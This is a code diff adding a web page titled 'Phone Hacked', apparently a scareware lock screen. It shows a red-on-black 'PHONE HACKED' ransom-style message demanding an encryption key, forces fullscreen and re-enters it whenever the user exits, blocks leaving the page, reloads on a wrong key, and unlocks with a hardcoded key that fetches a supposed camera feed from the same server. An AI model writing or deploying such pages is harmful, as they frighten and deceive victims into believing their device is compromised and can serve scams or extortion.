@@ -1,0 +1,96 @@
+<!-- Web 1: Phone Hacked Interface -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phone Hacked</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        #hackMessage {
+            font-size: 2em;
+            text-align: center;
+        }
+        #keyInput {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="hackMessage">PHONE HACKED $$ INSERT ENCRYPTION KEY $$</div>
+    <div id="keyInput">
+        <input type="password" id="encryptionKey" placeholder="Enter encryption key">
+        <button onclick="validateKey()">Submit</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // Force fullscreen on load
+        function forceFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Prevent exiting fullscreen
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                forceFullscreen();
+            }
+        });
+
+        document.addEventListener("webkitfullscreenchange", () => {
+            if (!document.webkitIsFullScreen) {
+                forceFullscreen();
+            }
+        });
+
+        // Prevent closing via browser
+        window.onbeforeunload = function() {
+            return "You cannot leave this page!";
+        };
+
+        // Validate encryption key
+        function validateKey() {
+            const key = document.getElementById("encryptionKey").value;
+            if (key === "BlessingGanteng") {
+                document.getElementById("status").innerText = "✅ Access Granted";
+                // Simulate camera feed from Web 2
+                fetch('/camera-feed')
+                    .then(response => response.blob())
+                    .then(blob => {
+                        const video = document.createElement('video');
+                        video.src = URL.createObjectURL(blob);
+                        video.autoplay = true;
+                        video.style.width = '100%';
+                        video.style.height = 'auto';
+                        document.body.appendChild(video);
+                    });
+            } else {
+                document.getElementById("status").innerText = "❌ Invalid Key";
+                // Force restart
+                window.location.reload();
+            }
+        }
+
+        // Auto fullscreen on load
+        window.onload = forceFullscreen;
+    </script>
+</body>
+</html>
